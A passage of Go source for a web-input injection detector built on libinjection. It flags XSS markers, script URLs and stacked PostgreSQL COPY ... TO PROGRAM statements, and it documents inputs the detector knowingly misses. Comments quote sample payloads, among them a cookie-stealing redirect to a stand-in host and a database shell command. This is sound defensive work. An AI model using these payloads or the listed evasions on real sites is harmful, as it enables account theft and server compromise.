//     placeholder inside the comment is masked again first.
//
// Accepted misses of isXSS (the same list, word for word, is in
// docs/threat-model.md and testdata/corpus/README.md; the test list is
// xssInertMarkupAcceptedMisses):
//
//  1. A call after `javascript: k=v; ` with plain spaces before the name and
//     the `(`, whose argument is one letter-only word that is no JS keyword
//     or listed browser global, or words separated by blanks alone:
//     `javascript: a=1; alert (x)`, `javascript: a=1; fetch (url)`,
//     `javascript: a=1; alert (screen)`. As a script the blank-separated form
//     is a SyntaxError, and the one-word form throws a ReferenceError unless
//     the name is defined, by the page or as a built-in (`screen`, `Date`,
//     `prompt`, `close`, `URL`, `status` and `event` are built-ins, so those
//     calls run).
//  2. A bare `<object>`, `<link>`, `<base>`, `<meta>` or `<embed>` with no
//     attribute on any tag in the value: `<link>`, `<object><embed>`. It
//     loads and runs nothing.
//  3. A `<!DOCTYPE` with no `>` and no `[` after it: `<!DOCTYPE html`. A
//     doctype runs nothing.
//  4. A backtick inside an HTML comment or a bogus comment (`<!...>`,
//     `<?...>`), when the value opens no raw-text or form element, holds no
//     `<script`, `javascript:`, `vbscript:`, `on<event>=` or `formaction=`,
//     and nothing in it is flagged by libinjection with the comments read
//     as live markup: "<!-- `x` --><math href=//evil.example>x</math>" (a
//     link, which libinjection does not flag without the comment either).
//  5. A JavaScript-string breakout followed by an HTML comment holding a
//     backtick: "';alert(1)//<!--`-->". libinjection has no JavaScript
//     context, and the breakout without the comment was never flagged.
//
// Cost: three linear scans and at most two masking passes and two more
// libinjection calls, only for a value libinjection already flagged.
func isInertMarkup(s string) bool {
	if strings.IndexByte(s, 0) >= 0 || hasXSSMarker(s) {
		return false
	}
	m, tick, ok := maskInertMarkup(s, !hasCommentHidingOpener(s))
	if !ok || libinjection.IsXSS(m) {
		return false
	}
	if tick < 0 {
		return true
	}
	live, _, _ := maskInertMarkup(commentDelimiters.Replace(m), true)
	return !libinjection.IsXSS(live)
}

// commentDelimiters blanks HTML comment openers and closers, so that what a
// comment holds is tokenized as live markup. Same length, so offsets hold.
var commentDelimiters = strings.NewReplacer("<!--", "    ", "-->", "   ", "-!>", "   ")

// commentHidingOpeners are elements whose content a browser does not parse
// as markup (RCDATA, RAWTEXT, script data, plaintext), plus "form", whose
// action libinjection does not flag. When one of them opens, a comment
// backtick is not masked, so libinjection's verdict stands as it was.
var commentHidingOpeners = [...]string{
	"title", "textarea", "xmp", "noembed", "noframes", "plaintext",
	"style", "script", "iframe", "noscript", "form",
}

// hasCommentHidingOpener reports whether s holds "<name" for a name in
// commentHidingOpeners, case-insensitive, ended by a blank, '/', '>', '\f'
// or the end of s ("<title>", "<TITLE x=1>", "<title/>", not "<titles>").
// One pass: the scan resumes after each tag name.
func hasCommentHidingOpener(s string) bool {
	for i := strings.IndexByte(s, '<'); i >= 0; {
		j := i + 1
		for j < len(s) && isLetter(s[j]) {
			j++
		}
		if j > i+1 && (j == len(s) || isBlank(s[j]) || s[j] == '/' || s[j] == '>' || s[j] == '\f') {
			for _, t := range commentHidingOpeners {
				if strings.EqualFold(s[i+1:j], t) {
					return true
				}
			}
		}
		k := strings.IndexByte(s[j:], '<')
		if k < 0 {
			return false
		}
		i = j + k
	}
	return false
}

// maskInertMarkup returns s with every backtick inside an HTML comment
// (only when comments is true), the '<' of every bare placeholder tag (only
// when no tag has an attribute) and the '<' of every "<!DOCTYPE" with no
// '>' or '[' after it replaced by a blank. tick is the index of the first
// masked backtick, or -1; ok reports whether anything was masked. A comment
// opens at "<!--" and closes at the first "-->" or "-!>" after it, and a
// bogus comment ("<!x", "<?x", not "<!DOCTYPE" or "<![CDATA[") closes at
// the first '>', as libinjection's tokenizer reads them. One pass over s:
// each comment is searched once and the scan resumes after it, and one
// search each for the last '>' and '[' answers every "<!DOCTYPE".
func maskInertMarkup(s string, comments bool) (masked string, tick int, ok bool) {
	tick = -1
	var b []byte
	set := func(i int) {
		if b == nil {
			b = []byte(s)
		}
		b[i] = ' '
	}
	lastGT := strings.LastIndexByte(s, '>')     // a doctype after it never closes
	lastSubset := strings.LastIndexByte(s, '[') // nor opens an internal subset
	var bare []int                              // '<' of each bare placeholder tag
	attrs := false                              // some tag has an attribute
	for i := 0; i < len(s); i++ {
		if s[i] != '<' {
			continue
		}
		body, end := -1, 0
		switch {
		case strings.HasPrefix(s[i:], "<!--"):
			body, end = i+4, commentEnd(s, i+4)
		case len(s)-i >= 9 && strings.EqualFold(s[i+1:i+9], "!doctype"):
			if i > lastGT && i > lastSubset {
				set(i)
			}
		case strings.HasPrefix(s[i:], "<![CDATA["):
			// text, not a comment
		case strings.HasPrefix(s[i:], "<!") || strings.HasPrefix(s[i:], "<?"):
			// a bogus comment, up to the first '>': "(?<![\\w.])" in a regex
			body, end = i+2, len(s)
			if k := strings.IndexByte(s[i+2:], '>'); k >= 0 {
				end = i + 2 + k + 1
			}
		case i+1 < len(s) && isLetter(s[i+1]):
			j := i + 1
			for j < len(s) && isIdentByte(s[j]) {
				j++
			}
			if j < len(s) && s[j] == '>' {
				if isInertPlaceholderTag(s[i+1 : j]) {
					bare = append(bare, i)
				}
			} else if tagHasAttribute(s, j) {
				attrs = true
			}
			i = j - 1
		}
		if body < 0 {
			continue
		}
		for k := body; comments && k < end; k++ {
			if s[k] == '`' {
				if tick < 0 {
					tick = k
				}
				set(k)
			}
		}
		i = end - 1
	}
	if !attrs {
		for _, i := range bare {
			set(i)
		}
	}
	if b == nil {
		return s, -1, false
	}
	return string(b), tick, true
}

// commentEnd returns the index just past the "-->" or "-!>" that closes an
// HTML comment whose body starts at s[i], or len(s) when it never closes.
func commentEnd(s string, i int) int {
	for {
		k := strings.IndexByte(s[i:], '-')
		if k < 0 || i+k+2 >= len(s) {
			return len(s)
		}
		k += i
		if (s[k+1] == '-' || s[k+1] == '!') && s[k+2] == '>' {
			return k + 3
		}
		i = k + 1
	}
}

// tagHasAttribute reports whether a tag name ending at s[j] is followed by
// an attribute: after blanks and '/', any byte other than '>' or the end of
// the value. "a <b and c" counts too, which only keeps a hit.
func tagHasAttribute(s string, j int) bool {
	for j < len(s) && (isBlank(s[j]) || s[j] == '/' || s[j] == '\f') {
		j++
	}
	return j < len(s) && s[j] != '>'
}

func isInertPlaceholderTag(name string) bool {
	for _, t := range inertPlaceholderTags {
		if strings.EqualFold(name, t) {
			return true
		}
	}
	return false
}

// hasXSSMarker reports whether s holds "<script", a javascript: or
// vbscript: scheme, or attribute text that runs or redirects: a word that
// starts with "on" and another letter (an event handler) or the word
// "formaction", then optional blanks (a form feed counts, as in an HTML
// tag) and '=' (or "&#61", "&#x3d", "&equals;", the character references
// for it). Case-insensitive. One pass over the words plus three substring
// searches.
func hasXSSMarker(s string) bool {
	if indexFold(s, "<script") >= 0 || indexFold(s, "javascript:") >= 0 || indexFold(s, "vbscript:") >= 0 {
		return true
	}
	for i := 0; i+2 < len(s); i++ {
		if !isLetter(s[i]) || i > 0 && isIdentByte(s[i-1]) {
			continue
		}
		j := i + 1
		for j < len(s) && isIdentByte(s[j]) {
			j++
		}
		w := s[i:j]
		handler := len(w) > 2 && w[0]|0x20 == 'o' && w[1]|0x20 == 'n' && isLetter(w[2])
		if handler || strings.EqualFold(w, "formaction") {
			for j < len(s) && (isBlank(s[j]) || s[j] == '\f') {
				j++
			}
			if j < len(s) && (s[j] == '=' || isEqualsRef(s[j:])) {
				return true
			}
		}
		i = j - 1
	}
	return false
}

// isEqualsRef reports whether s starts with a character reference for '=':
// "&#61", "&#x3d" (any case, leading zeros allowed) or "&equals;".
func isEqualsRef(s string) bool {
	if len(s) < 3 || s[0] != '&' {
		return false
	}
	if strings.HasPrefix(s, "&equals;") {
		return true
	}
	if s[1] != '#' {
		return false
	}
	base, j := 10, 2
	if s[2]|0x20 == 'x' {
		base, j = 16, 3
	}
	v, n := 0, 0
	for ; j < len(s) && n < 8; j, n = j+1, n+1 {
		d := hexVal(s[j])
		if d < 0 || d >= base {
			break
		}
		v = v*base + d
	}
	return n > 0 && v == '='
}

// hasScriptTagAnywhere finds a "<script" opening tag that libinjection's
// HTML tokenizer misses because it is nested in a broken one, e.g.
// "<scr<script>ipt>alert(1)</script>". "<script" counts only when the next
// byte ends the tag name: '>', '/', whitespace or another '<'. Prose such
// as "a < script", "1<scripts" or "price <script" (at the end of the value)
// stays clean. The scan is linear: it moves on after every candidate.
func hasScriptTagAnywhere(s string) bool {
	const tag = "<script"
	for off := 0; off < len(s); {
		i := indexFold(s[off:], tag)
		if i < 0 {
			return false
		}
		end := off + i + len(tag)
		if end < len(s) {
			switch s[end] {
			case '>', '/', '<', ' ', '\t', '\n', '\r', '\f':
				return true
			}
		}
		off += i + 1
	}
	return false
}

// hasStackedCopyProgram finds a stacked PostgreSQL "COPY ... TO|FROM PROGRAM"
// statement, which runs a shell command on the database host, e.g.
// "'; COPY (SELECT ”) TO PROGRAM 'id'--". libinjection has no COPY keyword
// and reads it as plain words, so it misses this. The match follows the
// statement's grammar to stay off prose: a ';', then COPY, then either a
// parenthesised query or one table name with an optional column list, then
// TO or FROM, PROGRAM and a quoted command. "Meet at 5; copy the list to
// program 'abc'" does not match (two words between COPY and TO).
//
// The scan never looks at a ';' inside a parenthesis group or comment that
// an earlier COPY already parsed (it does not start a statement there), and
// stops at the first group or comment that never closes (everything after it
// is inside). That keeps it linear on input such as a long repetition of
// ";copy(".
func hasStackedCopyProgram(s string) bool {
	for i := strings.IndexByte(s, ';'); i >= 0; {
		match, end := copyProgramAt(s, i+1)
		if match {
			return true
		}
		if end < 0 {
			return false
		}
		from := max(i+1, end)
		n := strings.IndexByte(s[from:], ';')
		if n < 0 {
			return false
		}
		i = from + n
	}
	return false
}

// copyProgramAt reports whether a COPY ... TO|FROM PROGRAM statement starts
// at s[i]. end is how far it parsed, or -1 when a parenthesis group or
// comment it entered never closes.
func copyProgramAt(s string, i int) (match bool, end int) {
	if i, _ = skipSQLSpace(s, i); i < 0 {
		return false, -1
	}
	if !wordAt(s, i, "copy") {
		return false, i
	}
	i += len("copy")
	i, sep := skipSQLSpace(s, i)
	switch {
	case i < 0:
		return false, -1
	case i < len(s) && s[i] == '(':
		if i = skipParens(s, i); i < 0 {
			return false, -1
		}
	case sep:
		start := i
		for i < len(s) && (isIdentByte(s[i]) || s[i] == '.' || s[i] == '"') {
			i++
		}
		if i == start {
			return false, i
		}
		j, _ := skipSQLSpace(s, i)
		if j < 0 {
			return false, -1
		}
		if j < len(s) && s[j] == '(' {
			if i = skipParens(s, j); i < 0 {
				return false, -1
			}
		}
	default:
		return false, i
	}
	if i, _ = skipSQLSpace(s, i); i < 0 {
		return false, -1
	}
	switch {
	case wordAt(s, i, "to"):
		i += len("to")
	case wordAt(s, i, "from"):
		i += len("from")
	default:
		return false, i
	}
	i, sep = skipSQLSpace(s, i)
	if i < 0 {
		return false, -1
	}
	if !sep || !wordAt(s, i, "program") {
		return false, i
	}
	if i, _ = skipSQLSpace(s, i+len("program")); i < 0 {
		return false, -1
	}
	if i < len(s) && (s[i] == 'e' || s[i] == 'E') {
		i++ // E'...' escape-string literal
	}
	return i < len(s) && (s[i] == '\'' || s[i] == '$'), i
}

// skipSQLSpace skips whitespace and /* */ comments from i. sep reports
// whether anything was skipped. next is -1 when a comment never closes.
func skipSQLSpace(s string, i int) (next int, sep bool) {
	start := i
	for i < len(s) {
		switch {
		case s[i] == ' ' || s[i] == '\t' || s[i] == '\n' || s[i] == '\r' || s[i] == '\f' || s[i] == '\v':
			i++
		case strings.HasPrefix(s[i:], "/*"):
			end := strings.Index(s[i+2:], "*/")
			if end < 0 {
				return -1, true
			}
			i += 2 + end + 2
		default:
			return i, i > start
		}
	}
	return i, i > start
}

// skipParens returns the index just past the parenthesis group opening at
// s[i], skipping single-quoted strings, or -1 when it is not closed.
func skipParens(s string, i int) int {
	depth := 0
	inQuote := false
	for ; i < len(s); i++ {
		c := s[i]
		switch {
		case inQuote:
			if c == '\'' {
				inQuote = false
			}
		case c == '\'':
			inQuote = true
		case c == '(':
			depth++
		case c == ')':
			depth--
			if depth == 0 {
				return i + 1
			}
		}
	}
	return -1
}

// wordAt reports whether the ASCII word w (lower case) starts at s[i],
// case-insensitively, and is not followed by another identifier byte.
func wordAt(s string, i int, w string) bool {
	if i+len(w) > len(s) || !strings.EqualFold(s[i:i+len(w)], w) {
		return false
	}
	return i+len(w) == len(s) || !isIdentByte(s[i+len(w)])
}

func isIdentByte(c byte) bool {
	return c == '_' || c >= '0' && c <= '9' || c >= 'a' && c <= 'z' || c >= 'A' && c <= 'Z'
}

// isScriptURL reports whether the whole value is a javascript: or vbscript:
// URL that runs code, e.g. "javascript:alert(1)" submitted as a link that is
// later rendered into an href. libinjection only flags such URLs inside an
// HTML attribute it can see, so a bare value slips through.
//
// Browsers ignore leading whitespace/control characters and tabs or
// newlines inside the scheme, so those are skipped too. To stay off prose
// such as the book title "JavaScript: The Good Parts", the scheme must be
// followed by code: an optional dotted identifier chain directly followed
// by '(', '`' or '=' (alert(1), window.location=...), or a '/' comment
// opener (javascript://%0Aalert(1)). HTML whitespace character references
// (&#9;, &#x0A;, &Tab;, ...) count as the whitespace they stand for, since a
// value written raw into an href is entity-decoded before the URL is read.
func isScriptURL(s string) bool {
	if strings.IndexByte(s, '&') >= 0 {
		s = decodeWhitespaceRefs(s)
	}
	i := 0
	for i < len(s) && s[i] <= ' ' {
		i++
	}
	var ok bool
	if i, ok = schemeAt(s, i, "javascript:"); !ok {
		if i, ok = schemeAt(s, i, "vbscript:"); !ok {
			return false
		}
	}
	for i < len(s) && (s[i] == ' ' || s[i] == '\t' || s[i] == '\n' || s[i] == '\r') {
		i++
	}
	if i < len(s) && s[i] == '/' {
		return true
	}
	// Only a literal space counts: browsers strip tab, CR and LF inside a
	// URL, so "javascript:\tlocation=name" is not prose.
	spaced := i > 0 && s[i-1] == ' '
	start := i
	dotted := false
	for i < len(s) && (isIdentByte(s[i]) || s[i] == '$' || s[i] == '.') {
		dotted = dotted || s[i] == '.'
		i++
	}
	if i == start || i >= len(s) {
		return false
	}
	switch s[i] {
	case '(', '`':
		return true
	case '=':
		// "javascript:location=..." and "javascript: document.cookie=..."
		// run code; "JavaScript: version=ES6" after a space, assigning a
		// bare name, is how prose writes a key and value, unless the name
		// is a browser global (assigning it navigates) or the rest holds
		// a call, template or statement ("a=1;alert(1)", "x=alert,x(1)").
		if !spaced || dotted {
			return true
		}
		rhs := s[i+1:]
		return isBrowserGlobal(s[start:i]) && !isInertWord(rhs) || hasCodeAfterAssign(rhs)
	}
	return false
}

// isInertWord reports whether rhs starts with a plain word that ends at a
// blank or the end of the value and is not a browser global: as a script,
// "top=10 tips" or "name=Ali" is at most a ReferenceError, while
// "location=name" navigates.
func isInertWord(rhs string) bool {
	j := 0
	for j < len(rhs) && isIdentByte(rhs[j]) {
		j++
	}
	if j == 0 || isBrowserGlobal(rhs[:j]) {
		return false
	}
	return j == len(rhs) || rhs[j] == ' ' || rhs[j] == '\t' || rhs[j] == '\n' || rhs[j] == '\r'
}

// hasCodeAfterAssign reports whether the text after "name=" holds a template
// literal, a call ('(' right after an identifier, ')' or ']': "alert(1)",
// "x(1)"), a statement separator followed directly by more code
// ("1;alert(1)"), or a later statement, after "; " or ", ", that is code
// itself (see isCodeStatement: "a=1; location=name"). Prose writes
// "level=beginner (2 weeks)" and "a=1; b=2", with a blank before '(' and
// after ';', and its later clauses are plain words.
func hasCodeAfterAssign(rhs string) bool {
	for j := 0; j < len(rhs); j++ {
		switch rhs[j] {
		case '`':
			return true
		case '(':
			if j > 0 && (isIdentByte(rhs[j-1]) || rhs[j-1] == ')' || rhs[j-1] == ']') {
				return true
			}
		case ';', ',':
			k := j + 1
			for k < len(rhs) && isBlank(rhs[k]) {
				k++
			}
			if rhs[j] == ';' && k == j+1 && k < len(rhs) {
				return true
			}
			if k > j+1 && isCodeStatement(rhs[k:], rhs[j] == ';', strings.Count(rhs[j+1:k], " ") == k-j-1) {
				return true
			}
		}
	}
	return false
}

func isBlank(c byte) bool { return c == ' ' || c == '\t' || c == '\n' || c == '\r' }

// isCodeStatement reports whether st starts a JavaScript statement that does
// something: a dotted name assigned, called or indexed ("top.location=name",
// "document.location='//x'"), a name called with blanks before '(' or
// tagged with a template ("alert (1)", "alert`1`"; a blank before '(' only
// counts after ';', since "a=1, duration (2 weeks)" is prose), or a browser
// global assigned a value that is not an inert word ("location=name",
// "location='//evil/?'+document.cookie"). "b=2", "maybe", "e.g. later" and
// "name=Ali" are not, and neither is a call after "; " with plain spaces
// before the name and the '(' whose arguments read as prose (see
// isCodeArgs): "maybe (later)". plainSemi reports whether only spaces
// (0x20) separate the ';' from st; a tab or newline there, or before the
// '(', is how code is laid out, not prose, and keeps the call code, as does
// a callee that is a browser global or JS keyword ("location (x)").
func isCodeStatement(st string, afterSemi, plainSemi bool) bool {
	i, dotted := 0, false
	for i < len(st) && (isIdentByte(st[i]) || st[i] == '$' || st[i] == '.') {
		dotted = dotted || st[i] == '.'
		i++
	}
	if i == 0 {
		return false
	}
	name := st[:i]
	for i < len(st) && isBlank(st[i]) {
		i++
	}
	if i >= len(st) {
		return false
	}
	switch st[i] {
	case '`':
		return true
	case '(':
		if i == len(name) {
			return true
		}
		if !afterSemi {
			return false
		}
		if !plainSemi || strings.Count(st[len(name):i], " ") != i-len(name) || isBrowserGlobal(name) || isJSKeyword(name) {
			return true
		}
		return isCodeArgs(st[i+1:])
	case '[':
		return dotted
	case '=':
		if i+1 < len(st) && st[i+1] == '=' {
			return false // a comparison, not an assignment
		}
		rhs := st[i+1:]
		return dotted && strings.TrimLeft(rhs, " \t") != "" || isBrowserGlobal(name) && !isInertWord(rhs)
	}
	return false
}

// isCodeArgs reports whether a, the text after the '(' of a call written
// with a blank before it ("alert (1)"), reads as code arguments rather than
// a parenthetical aside ("maybe (later)", "practise (daily)", "(2 days)").
// The arguments read as prose only when both hold:
//
//   - every byte up to the first ')' is a letter, a digit, a blank, '-' or
//     ',' (a ')' must come). Any other byte (a quote, '.', '/', '\', '=',
//     '(', '_', '$', ...) is code: "alert ('x')", "alert (x.y)".
//   - the words (runs of letters and digits) are either exactly one
//     letter-only word, with no '-' or ',' beside it, that is no JS keyword
//     or browser global ("(later)", not "(this)", "(name)", "(cookie)",
//     "(- x)"), or include two words separated
//     by blanks alone, which cannot parse as JavaScript, with none of them a
//     keyword ("(2 days)", "(-2 dollars)", "(see notes)", not "(new Image)",
//     "(typeof x)", "(x in y)").
//
// Everything else is code: "()", "(1)", "(0x1)", "(- x)", "(x - y)",
// "(a, b)". A single plain word ("alert (x)", "fetch (url)") is the
// accepted cost: as a script it throws a ReferenceError unless the name is
// defined, by the page or as a built-in ("alert (screen)" runs). The scan
// stops at the first ')' or the first byte outside the prose set, and a ';'
// is outside it, so the calls from hasCodeAfterAssign never read the same
// bytes twice: linear.
func isCodeArgs(a string) bool {
	words, adjacent, punct := 0, false, false
	var first string
	prevWord, gapBlank := false, false // the last token was a word; only blanks since
	for i := 0; i < len(a); {
		c := a[i]
		switch {
		case c == ')':
			if words == 1 && !punct {
				return !isLetterWord(first) || isJSKeyword(first) || isArgGlobal(first)
			}
			return !adjacent
		case isLetter(c) || isDigit(c):
			j := i
			for j < len(a) && (isLetter(a[j]) || isDigit(a[j])) {
				j++
			}
			w := a[i:j]
			if isJSKeyword(w) {
				return true
			}
			if words == 0 {
				first = w
			}
			if prevWord && gapBlank {
				adjacent = true
			}
			words++
			prevWord, gapBlank = true, false
			i = j
			continue
		case isBlank(c):
			gapBlank = gapBlank || prevWord
		case c == '-' || c == ',':
			prevWord, gapBlank, punct = false, false, true
		default:
			return true
		}
		i++
	}
	return true // no ')': not a closed aside
}

// isLetterWord reports whether w is letters only.
func isLetterWord(w string) bool {
	for i := 0; i < len(w); i++ {
		if !isLetter(w[i]) {
			return false
		}
	}
	return true
}

// isJSKeyword reports whether w is a JavaScript reserved word or literal
// name that an argument list can hold, including the keyword operators that
// make two blank-separated words valid code ("new Image", "typeof x",
// "x in y", "await 1").
func isJSKeyword(w string) bool {
	switch w {
	case "new", "void", "typeof", "await", "delete", "yield", "in", "instanceof", "of",
		"async", "function", "class", "this", "super", "null", "true", "false",
		"undefined", "NaN", "Infinity", "arguments", "import", "let", "var", "const":
		return true
	}
	return false
}

// isArgGlobal reports whether w is a browser global worth reading as an
// argument: the navigating globals of isBrowserGlobal plus the stores and
// names a payload exfiltrates or uses ("alert (cookie)", "alert (origin)").
func isArgGlobal(w string) bool {
	if isBrowserGlobal(w) {
		return true
	}
	switch w {
	case "cookie", "origin", "localStorage", "sessionStorage", "history", "navigator",
		"frames", "globalThis", "indexedDB", "crypto", "fetch", "alert", "eval":
		return true
	}
	return false
}

// decodeWhitespaceRefs replaces the HTML character references for tab, LF
// and CR (&#9;, &#09;, &#x9;, &#X0A;, &#10;, &#13;, &Tab;, &NewLine; and
// their forms without the closing ';') with the bytes they stand for.
// Other references are left as they are.
func decodeWhitespaceRefs(s string) string {
	var b strings.Builder
	last := 0
	for i := 0; i < len(s); i++ {
		if s[i] != '&' {
			continue
		}
		c, n := whitespaceRefAt(s[i:])
		if n == 0 {
			continue
		}
		if b.Len() == 0 {
			b.Grow(len(s))
		}
		b.WriteString(s[last:i])
		b.WriteByte(c)
		i += n - 1
		last = i + 1
	}
	if last == 0 {
		return s
	}
	b.WriteString(s[last:])
	return b.String()
}

// whitespaceRefAt matches a whitespace character reference at the start of
// s ("&..."). It returns the byte and the reference length, or 0, 0.
func whitespaceRefAt(s string) (byte, int) {
	for _, r := range [...]struct {
		name string
		c    byte
	}{{"&Tab;", '\t'}, {"&NewLine;", '\n'}} {
		if strings.HasPrefix(s, r.name) {
			return r.c, len(r.name)
		}
	}
	if len(s) < 3 || s[1] != '#' {
		return 0, 0
	}
	j, base := 2, 10
	if s[j] == 'x' || s[j] == 'X' {
		j, base = 3, 16
	}
	start, v := j, 0
	for ; j < len(s) && j-start < 8; j++ {
		d := hexVal(s[j])
		if d < 0 || d >= base {
			break
		}
		v = v*base + d
	}
	if j == start {
		return 0, 0
	}
	if j < len(s) && s[j] == ';' {
		j++
	}
	switch v {
	case 9, 10, 13:
		return byte(v), j
	}
	return 0, 0
}

func hexVal(c byte) int {
	switch {
	case c >= '0' && c <= '9':
		return int(c - '0')
	case c >= 'a' && c <= 'f':
		return int(c-'a') + 10
	case c >= 'A' && c <= 'F':
		return int(c-'A') + 10
	}
	return -1
}

// isBrowserGlobal reports whether name is a window property whose
// assignment navigates or replaces the page. JavaScript names are case
// sensitive, so "Name=Ali" in prose is not one.
func isBrowserGlobal(name string) bool {
	switch name {
	case "location", "top", "self", "parent", "window", "document", "opener", "name":
		return true
	}
	return false
}

// schemeAt matches the lower-case scheme at s[i] case-insensitively,
// ignoring tab, CR and LF between its letters as browsers do. It returns the
// index after the match, or i unchanged and false.
func schemeAt(s string, i int, scheme string) (int, bool) {
	j := i
	for k := 0; k < len(scheme); j++ {
		if j >= len(s) {
			return i, false
		}
		c := s[j]
		if c == '\t' || c == '\n' || c == '\r' {
			continue
		}
		if c >= 'A' && c <= 'Z' {
			c += 'a' - 'A'
		}
		if c != scheme[k] {
			return i, false
		}
		k++
	}
	return j, true
}
